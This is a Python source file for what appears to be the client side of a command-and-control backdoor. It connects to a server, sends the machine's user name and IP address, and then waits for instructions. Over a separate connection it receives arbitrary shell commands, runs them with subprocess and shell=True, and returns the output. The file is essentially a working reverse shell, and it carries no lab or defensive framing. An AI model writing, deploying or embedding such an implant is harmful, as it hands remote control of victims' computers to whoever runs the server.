import socket
import subprocess
import threading
import time
import traceback
import os

def handle_server_commands(s):
    while True:
        try:
            data = s.recv(1024).decode('utf-8')
            if data.startswith("COMMAND_PORT"):
                temp_port = int(data.split()[1])
                handle_temp_command(s.getpeername()[0], temp_port)
            elif data.startswith("PING_PORT"):
                temp_port = int(data.split()[1])
                handle_ping_command(s.getpeername()[0], temp_port)
        except Exception as e:
            print(f"Error handling command: {e}")
            traceback.print_exc()
            break
    s.close()

def handle_temp_command(server_ip, temp_port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((server_ip, temp_port))
        command = s.recv(1024).decode('utf-8')
        if command == "EXIT":
            os._exit(0)  # Terminate the client process immediately
        try:
            result = subprocess.check_output(command, shell=True).decode('utf-8')
        except subprocess.CalledProcessError as e:
            result = str(e)
        s.sendall(result.encode('utf-8'))

def handle_ping_command(server_ip, temp_port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((server_ip, temp_port))
        s.sendall(b"PONG")

def send_agent_info():
    host = '127.0.0.1'
    port = 1155
    try:
        name = subprocess.check_output('whoami', shell=True).decode('utf-8').strip()  # Get the user name
        ip_address = socket.gethostbyname(socket.gethostname())  # Get the IP address
        agent_info = f"{name},{ip_address}"
    except Exception as e:
        print(f"Error getting agent info: {e}")
        traceback.print_exc()
        return

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((host, port))
            s.sendall(agent_info.encode('utf-8'))  # Send agent info
            threading.Thread(target=handle_server_commands, args=(s,)).start()
            while True:
                time.sleep(5)
        except Exception as e:
            print(f"Error connecting to server: {e}")
            traceback.print_exc()

if __name__ == '__main__':
    send_agent_info()
